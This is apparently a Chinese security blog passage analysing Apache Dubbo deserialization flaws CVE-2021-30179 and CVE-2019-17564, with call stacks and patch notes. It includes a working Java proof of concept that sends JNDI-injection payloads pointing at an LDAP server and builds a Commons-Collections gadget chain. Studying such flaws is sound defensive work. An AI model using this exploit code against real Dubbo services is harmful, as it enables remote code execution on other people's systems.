[![](https://storage.tttang.com/media/attachment/2022/09/06/30a47fa4-0d18-4309-8aec-c10b8a7266dc.png)](https://storage.tttang.com/media/attachment/2022/09/06/30a47fa4-0d18-4309-8aec-c10b8a7266dc.png)

#### [CVE-2021-30179](#toc_cve-2021-30179)

##### [影响](#toc__9)

Apache Dubbo 2.7.0 to 2.7.9

Apache Dubbo 2.6.0 to 2.6.9

##### [分析](#toc__10)

根据前面的分析我们知道，会调用`DecodeHandler#decode`方法进行处理

之后在`DecodeHandler#decode`方法中存在过滤操作

[![](https://storage.tttang.com/media/attachment/2022/09/06/6ba7003a-7fd3-40f7-94a2-bb367de42d3e.png)](https://storage.tttang.com/media/attachment/2022/09/06/6ba7003a-7fd3-40f7-94a2-bb367de42d3e.png)

判断方法名是否为 invoke 或者 invokeAsync，desc 是否为 Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;，如果不满足则直接抛出异常

decode 完成之后将调用 HeaderExchangeHandler.java#received 方法处理请求，若为泛型引用，则将调用 GenericFilter#invoke 方法

[![](https://storage.tttang.com/media/attachment/2022/09/06/0e3f38c8-7feb-4fa6-b2e0-bb27d8fb2607.png)](https://storage.tttang.com/media/attachment/2022/09/06/0e3f38c8-7feb-4fa6-b2e0-bb27d8fb2607.png)

在获取了方法名 / 类型 / 参数之后，将会通过反射获取该方法，如果不存在就会抛出异常

接下来将通过获取请求中的 generic 参数来选择通过 raw.return/nativejava/bean 反序列化参数成 pojo 对象

[![](https://storage.tttang.com/media/attachment/2022/09/06/0d90626c-c8cf-4ca3-b2f0-52871450d8a2.png)](https://storage.tttang.com/media/attachment/2022/09/06/0d90626c-c8cf-4ca3-b2f0-52871450d8a2.png)

1.  如果 generic 为 raw.return 或者 true，将调用 PojoUtils#realize 方法

[![](https://storage.tttang.com/media/attachment/2022/09/06/8b3e6b30-a00c-4798-b712-c92160cf7bc6.png)](https://storage.tttang.com/media/attachment/2022/09/06/8b3e6b30-a00c-4798-b712-c92160cf7bc6.png)

[![](https://storage.tttang.com/media/attachment/2022/09/06/27f5b048-7279-4502-8da8-79667f062293.png)](https://storage.tttang.com/media/attachment/2022/09/06/27f5b048-7279-4502-8da8-79667f062293.png)

接着调用了`readlize` `realize0`

在 readlize0 中的逻辑为

> 若 pojo 为 Map 实例，则从 pojo（也就是一开始的第三个参数）获取 key 为 “class” 的值，并通过反射得到 class 所对应的类 type，再判断对象的类型进行下一步处理
> 
> 如果 type 不是 Map 的子类、不为 Object.class 且不是接口，则进入 else，在 else 中，对 type 通过反射进行了实例化，得到对象 dest
> 
> 再对 pojo 进行遍历，以键名为 name，值为 value，调用 getSetterMethod(dest.getClass(), name, value.getClass()); 获取 set 方法

[![](https://storage.tttang.com/media/attachment/2022/09/06/0d14a512-0a6f-4579-8c4a-d90c9de9ba43.png)](https://storage.tttang.com/media/attachment/2022/09/06/0d14a512-0a6f-4579-8c4a-d90c9de9ba43.png)

，之后就可以通过`org.apache.xbean.propertyeditor.JndiConverter`类中的`setAsText`方法进行 JNDI 注入

调用栈：

```
setAsText:59, AbstractConverter (org.apache.xbean.propertyeditor)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:497, Method (java.lang.reflect)
realize0:483, PojoUtils (org.apache.dubbo.common.utils)
realize:211, PojoUtils (org.apache.dubbo.common.utils)
realize:99, PojoUtils (org.apache.dubbo.common.utils)
invoke:91, GenericFilter (org.apache.dubbo.rpc.filter)
invoke:83, ProtocolFilterWrapper$1 (org.apache.dubbo.rpc.protocol)
invoke:38, ClassLoaderFilter (org.apache.dubbo.rpc.filter)
invoke:83, ProtocolFilterWrapper$1 (org.apache.dubbo.rpc.protocol)
invoke:41, EchoFilter (org.apache.dubbo.rpc.filter)
invoke:83, ProtocolFilterWrapper$1 (org.apache.dubbo.rpc.protocol)
reply:145, DubboProtocol$1 (org.apache.dubbo.rpc.protocol.dubbo)
received:152, DubboProtocol$1 (org.apache.dubbo.rpc.protocol.dubbo)
received:177, HeaderExchangeHandler (org.apache.dubbo.remoting.exchange.support.header)
```

1.  如果 generic 为 bean, 则将会调用`JavaBeanSerializeUtil#deserialize`处理

[![](https://storage.tttang.com/media/attachment/2022/09/06/80dae498-81e9-4c84-8962-240cc047d8fd.png)](https://storage.tttang.com/media/attachment/2022/09/06/80dae498-81e9-4c84-8962-240cc047d8fd.png)

其中调用了`instantiateForDeserialize`方法，返回一个 JavaBeanDescriptor 描述的对象

之后调用`deserializeInternal`进行反序列化， 如果 beanDescriptor.isBeanType()（只需要实例化 JavaBeanDescriptor 时指定即可），则将遍历 beanDescriptor，获取 property 及 value，调用 getSetterMethod 获取对应的 set 方法

最后利用反射执行 method.invoke(dest, value);，就可以使用 org.apache.xbean.propertyeditor.JndiConverter 的 setAsText 发起 JNDI 注入了

[![](https://storage.tttang.com/media/attachment/2022/09/06/ff69d5ab-6db7-4d2c-9c0f-6ac6f7f6c89d.png)](https://storage.tttang.com/media/attachment/2022/09/06/ff69d5ab-6db7-4d2c-9c0f-6ac6f7f6c89d.png)

##### [调用栈](#toc__11)

```
setAsText:59, AbstractConverter (org.apache.xbean.propertyeditor)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:497, Method (java.lang.reflect)
deserializeInternal:282, JavaBeanSerializeUtil (org.apache.dubbo.common.beanutil)
deserialize:215, JavaBeanSerializeUtil (org.apache.dubbo.common.beanutil)
deserialize:204, JavaBeanSerializeUtil (org.apache.dubbo.common.beanutil)
invoke:115, GenericFilter (org.apache.dubbo.rpc.filter)
invoke:83, ProtocolFilterWrapper$1 (org.apache.dubbo.rpc.protocol)
invoke:38, ClassLoaderFilter (org.apache.dubbo.rpc.filter)
invoke:83, ProtocolFilterWrapper$1 (org.apache.dubbo.rpc.protocol)
invoke:41, EchoFilter (org.apache.dubbo.rpc.filter)
invoke:83, ProtocolFilterWrapper$1 (org.apache.dubbo.rpc.protocol)
reply:145, DubboProtocol$1 (org.apache.dubbo.rpc.protocol.dubbo)
received:152, DubboProtocol$1 (org.apache.dubbo.rpc.protocol.dubbo)
received:177, HeaderExchangeHandler (org.apache.dubbo.remoting.exchange.support.header)
```

1.  如果 generic 是 nativejava, 将遍历 args，如果 args[i] 的类型为 byte，以 args[] 为参实例化一个 UnsafeByteArrayInputStream，再通过反射获得 NativeJavaSerialization，再调用 NativeJavaSerialization#readObject 方法

[![](https://storage.tttang.com/media/attachment/2022/09/06/b39c0678-9f04-4f7a-bedd-610c5119945e.png)](https://storage.tttang.com/media/attachment/2022/09/06/b39c0678-9f04-4f7a-bedd-610c5119945e.png)

相当于执行了`UnsafeByteArrayInputStream#readObject`方法造成了反序列化

调用栈

```
readObject:371, ObjectInputStream (java.io)
readObject:50, NativeJavaObjectInput (org.apache.dubbo.common.serialize.nativejava)
invoke:98, GenericFilter (org.apache.dubbo.rpc.filter)
invoke:83, ProtocolFilterWrapper$1 (org.apache.dubbo.rpc.protocol)
invoke:38, ClassLoaderFilter (org.apache.dubbo.rpc.filter)
invoke:83, ProtocolFilterWrapper$1 (org.apache.dubbo.rpc.protocol)
invoke:41, EchoFilter (org.apache.dubbo.rpc.filter)
invoke:83, ProtocolFilterWrapper$1 (org.apache.dubbo.rpc.protocol)
reply:145, DubboProtocol$1 (org.apache.dubbo.rpc.protocol.dubbo)
received:152, DubboProtocol$1 (org.apache.dubbo.rpc.protocol.dubbo)
received:177, HeaderExchangeHandler (org.apache.dubbo.remoting.exchange.support.header)
```

POC:

```
public static void main(String[] args) throws Exception {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

        // header.
        byte[] header = new byte[16];
        // set magic number.
        Bytes.short2bytes((short) 0xdabb, header);
        // set request and serialization flag.
        header[2] = (byte) ((byte) 0x80 | 2);

        // set request id.
        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);
        ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
        Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);

        // set body
        out.writeUTF("2.7.9");
        // todo 此处填写Dubbo提供的服务名
        out.writeUTF("org.apache.dubbo.spring.boot.demo.consumer.DemoService");
        out.writeUTF("");
        out.writeUTF("$invoke");
        out.writeUTF("Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;");
        // todo 此处填写Dubbo提供的服务的方法
        out.writeUTF("sayHello");
        out.writeObject(new String[] {"java.lang.String"});

        // POC 1: raw.return
//        getRawReturnPayload(out, "ldap://127.0.0.1:8087/Exploit");

        // POC 2: bean
        getBeanPayload(out, "ldap://127.0.0.1:1389/xitdbc");

        // POC 3: nativejava
//        getNativeJavaPayload(out, "src\\main\\java\\top\\lz2y\\1.ser");

        out.flushBuffer();

        Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);
        byteArrayOutputStream.write(header);
        byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());

        byte[] bytes = byteArrayOutputStream.toByteArray();

        //todo 此处填写Dubbo服务地址及端口
        Socket socket = new Socket("127.0.0.1", 9999);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(bytes);
        outputStream.flush();
        outputStream.close();
    }
    private static void getRawReturnPayload(Hessian2ObjectOutput out, String ldapUri) throws IOException {
        HashMap jndi = new HashMap();
        jndi.put("class", "org.apache.xbean.propertyeditor.JndiConverter");
        jndi.put("asText", ldapUri);
        out.writeObject(new Object[]{jndi});

        HashMap map = new HashMap();
        map.put("generic", "raw.return");
        out.writeObject(map);
    }

    private static void getBeanPayload(Hessian2ObjectOutput out, String ldapUri) throws IOException {
        JavaBeanDescriptor javaBeanDescriptor = new JavaBeanDescriptor("org.apache.xbean.propertyeditor.JndiConverter",7);
        javaBeanDescriptor.setProperty("asText",ldapUri);
        out.writeObject(new Object[]{javaBeanDescriptor});
        HashMap map = new HashMap();

        map.put("generic", "bean");
        out.writeObject(map);
    }

    private static void getNativeJavaPayload(Hessian2ObjectOutput out, String serPath) throws Exception, NotFoundException {
        //创建TemplatesImpl对象加载字节码
        byte[] code = ClassPool.getDefault().get("ysoserial.vulndemo.Calc").toBytecode();
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj,"_name","RoboTerh");
        setFieldValue(obj,"_class",null);
        setFieldValue(obj,"_tfactory",new TransformerFactoryImpl());
        setFieldValue(obj,"_bytecodes",new byte[][]{code});

        //创建 ChainedTransformer实例
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{obj}),
        };
        ChainedTransformer chain = new ChainedTransformer(transformers);

        //创建TranformingComparator 实例
        Comparator comparator = new TransformingComparator(chain);

        PriorityQueue priorityQueue = new PriorityQueue(2);
        priorityQueue.add(1);
        priorityQueue.add(2);
        Field field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
        field.setAccessible(true);
        field.set(priorityQueue, comparator);

        //序列化
        ByteArrayOutputStream baor = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baor);
        oos.writeObject(priorityQueue);
        oos.close();
        byte[] payload = baor.toByteArray();

        out.writeObject(new Object[] {payload});

        HashMap map = new HashMap();
        map.put("generic", "nativejava");
        out.writeObject(map);
    }
```

##### [补丁](#toc__12)

在 2.7.10 版本使用了黑名单来阻断 raw.return 和 bean 这两条链

分别在`org\apache\dubbo\common\utils\PojoUtils.java#realize0` `org\apache\dubbo\common\beanutil\JavaBeanSerializeUtil.java#name2Class`

而 nativejava 则通过判断配置文件是否允许 nativejava 的反序列化

### [Http 协议](#toc_http)

#### [CVE-2019-17564](#toc_cve-2019-17564)

##### [影响范围](#toc__13)

*   2.7.0 <= Apache Dubbo <= 2.7.4
*   2.6.0 <= Apache Dubbo <= 2.6.7
*   Apache Dubbo = 2.5.x

##### [环境](#toc__14)

将 pom.xml 中的`<dubbo.version>`标签中的属性值改为 2.7.3 版本

##### [分析](#toc__15)

这个 CVE 主要是因为在发送 POST 请求的时候将会将 body 中的数据进行反序列化处理造成了漏洞

我们可以在开启服务提供者了之后，在`org.apache.dubbo.remoting.http.servlet.DispatcherServlet#service`处打下断点，这个类主要是处理请求的分发的类，在接收到 http 请求之后会调用 service 方法

之后随便发送一个 post 请求

```
curl -X POST -d 'aa' 'http://192.168.56.1:8080/org.apache.dubbo.samples.http.api.DemoService'
```

[![](https://storage.tttang.com/media/attachment/2022/09/06/e1cd5648-9b3d-4c8f-91e9-73e3ed4ccd4e.png)](https://storage.tttang.com/media/attachment/2022/09/06/e1cd5648-9b3d-4c8f-91e9-73e3ed4ccd4e.png)

成功拦截了这个 handler, 之后会调用 handle 方法

[![](https://storage.tttang.com/media/attachment/2022/09/06/8177dc2e-7e4f-4ea3-882d-1746aa35b4cc.png)](https://storage.tttang.com/media/attachment/2022/09/06/8177dc2e-7e4f-4ea3-882d-1746aa35b4cc.png)

之后调用`request.getRequestURI`方法，获取 path 路径，之后会在之后查找 uri 路径是否在 skeletonMap 中

[![](https://storage.tttang.com/media/attachment/2022/09/06/7e709599-0d40-4dd4-bd98-6a37e355da92.png)](https://storage.tttang.com/media/attachment/2022/09/06/7e709599-0d40-4dd4-bd98-6a37e355da92.png)

如果没有，之后将会返回错误，当然是因为没有提供对应的服务啊！

之后就是获取远程地址和远程地址的端口，最后调用了`skeleton.handleRequest`方法

这个时候 skeleton 是`HttpInvokerServiceExporter`类，值得关注的他的 contentType 居然是`application/x-java-serialized-object`类型

[![](https://storage.tttang.com/media/attachment/2022/09/06/faf1398c-11fb-4d69-8a5d-7c4512b00918.png)](https://storage.tttang.com/media/attachment/2022/09/06/faf1398c-11fb-4d69-8a5d-7c4512b00918.png)

来到 handleRequest 方法

[![](https://storage.tttang.com/media/attachment/2022/09/06/50516b18-3365-4f80-bc82-4f5ced32c5be.png)](https://storage.tttang.com/media/attachment/2022/09/06/50516b18-3365-4f80-bc82-4f5ced32c5be.png)

跟进`readRemoteInvocation`方法调用

[![](https://storage.tttang.com/media/attachment/2022/09/06/700baf3d-f92f-46f9-8b90-9cf003219fd6.png)](https://storage.tttang.com/media/attachment/2022/09/06/700baf3d-f92f-46f9-8b90-9cf003219fd6.png)

继续调用其方法重载（加上了个 request 作用域的输入流作为参数

[![](https://storage.tttang.com/media/attachment/2022/09/06/f6ac830d-eee9-4d7b-acb6-f2fe571dbee3.png)](https://storage.tttang.com/media/attachment/2022/09/06/f6ac830d-eee9-4d7b-acb6-f2fe571dbee3.png)

在上面箭头位置，比如要在 request 域中获取 inputstream，不然不会进入`doReadRemoteInvocation`方法的调用

我们跟进漏洞触发点方法`doReadRemoteInvocation`方法

[![](https://storage.tttang.com/media/attachment/2022/09/06/111a1a98-5f0a-4205-8927-f3ff22148a70.png)](https://storage.tttang.com/media/attachment/2022/09/06/111a1a98-5f0a-4205-8927-f3ff22148a70.png)

在这里将 ois 这个 ObejctInputStream 对象直接没有过滤就进行了反序列化的调用，造成了反序列化漏洞

好了，调用链就到了这里，剩下的就是通过这个点打 CC 依赖

我们添加 CC3.2 的依赖，打 CC4 链子

##### [补丁](#toc__16)

在`2.7.5`版本中，在获取了 skeleton 之后调用其 handle 方法，此时的 skeleton 是`JsonRpcServer`对象

[![](https://storage.tttang.com/media/attachment/2022/09/06/77fb07e8-89dd-470b-be8a-8999671d7de4.png)](https://storage.tttang.com/media/attachment/2022/09/06/77fb07e8-89dd-470b-be8a-8999671d7de4.png)

我们也可以知道其是调用的其父类的 handler 方法

[![](https://storage.tttang.com/media/attachment/2022/09/06/4ac75123-1e4e-47d0-aa18-b8b2f51091e0.png)](https://storage.tttang.com/media/attachment/2022/09/06/4ac75123-1e4e-47d0-aa18-b8b2f51091e0.png)

在其中没有可反序列化的操作

[![](https://storage.tttang.com/media/attachment/2022/09/06/4a99c0e4-3fad-4a94-9ef1-dae258748fb6.png)](https://storage.tttang.com/media/attachment/2022/09/06/4a99c0e4-3fad-4a94-9ef1-dae258748fb6.png)

[其他](#toc__17)
--------------

当然还有这 Redis / Kryo 等等协议造成的漏洞等下篇继续学习学习总结

[Ref](#toc_ref)
---------------

[https://cert.360.cn/report/detail?id=fdf2dd6ab0c6e39e18a725ea86ad66bb](https://cert.360.cn/report/detail?id=fdf2dd6ab0c6e39e18a725ea86ad66bb)

[https://www.anquanke.com/post/id/209251](https://www.anquanke.com/post/id/209251)

[https://cloud.tencent.com/developer/article/1865614](https://cloud.tencent.com/developer/article/1865614)

[https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/](https://securitylab.github.com/advisories/GHSL-2021-034_043-apache-dubbo/)

[https://github.com/threedr3am](https://github.com/threedr3am)